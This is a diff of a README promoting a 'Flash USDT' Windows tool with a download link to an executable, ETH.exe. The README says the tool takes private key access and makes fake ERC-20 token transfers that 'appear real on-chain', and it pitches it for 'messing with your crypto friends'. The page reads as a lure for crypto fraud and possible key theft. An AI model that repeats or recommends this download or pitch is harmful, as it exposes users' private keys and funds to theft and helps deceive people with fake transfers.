@@ -1,20 +1,14 @@
 <h1 align="center"><b> ⚡ Ethereum Flash USDT Windows Tool </b></h1>
 
-A lightweight, GUI-based Ethereum education utility designed for **flash token transfers** using private key access. Built with ❤️ in Python and Tkinter, this tool lets you simulate ERC-20 token transfers that appear **real** on-chain — even though they're purely for visual effect.
-
-<h1 align="center"><b>🚀 Download Now</b></h1>
-
 <p align="center">
-  <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/Flash/ETH.exe>
-    <img src="https://img.shields.io/badge/⬇️-Download-green?style=for-the-badge&logo=github" alt="Download">
+  <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/Flash/ETH.exe">
+    <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
 
-> 💡 Perfect for testing, demos, or messing with your crypto friends. Looks real. Feels real. Isn't real.
+A lightweight, GUI-based Ethereum education utility designed for **flash token transfers** using private key access. Built with ❤️ in Python and Tkinter, this tool lets you simulate ERC-20 token transfers that appear **real** on-chain — even though they're purely for visual effect.
 
-<p align="center">
- <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/Flash/ETH.exe">
-</p>
+> 💡 Perfect for testing, demos, or messing with your crypto friends. Looks real. Feels real. Isn't real.
 
 ## 🚀 Features
 
